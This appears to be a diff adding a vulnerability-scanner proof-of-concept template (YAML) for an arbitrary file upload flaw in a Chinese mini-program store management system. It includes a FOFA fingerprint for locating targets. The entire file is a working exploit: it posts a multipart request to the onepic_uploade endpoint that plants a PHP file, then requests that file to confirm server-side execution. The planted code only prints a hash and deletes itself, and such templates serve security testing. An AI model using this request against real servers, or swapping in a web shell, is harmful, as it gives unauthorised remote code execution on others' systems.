@@ -1,0 +1,36 @@
+id: poc-yaml-internet-wxapps-onepic-uploade-anyfile-upload
+info:
+  name: 万能门店小程序系统 onepic_uploade 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 全行业小程序运营系统
+  fofa: /comhome/cases/index.html
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt1: datetime("2006")
+  dt2: datetime("01")
+  dt3: datetime("02")
+requests:
+- method: POST
+  path: /comadmin/Remote/onepic_uploade?file=file
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz
+  data: '------WebKitFormBoundaryBiKyL9D0p5OtH5zz
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryBiKyL9D0p5OtH5zz--'
+  expression: status_code == 200 && contains(body,".php") && contains(body,"upimages")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{32,35}).php")
+- method: GET
+  path: /upimages/{{.dt1}}{{.dt2}}{{.dt3}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
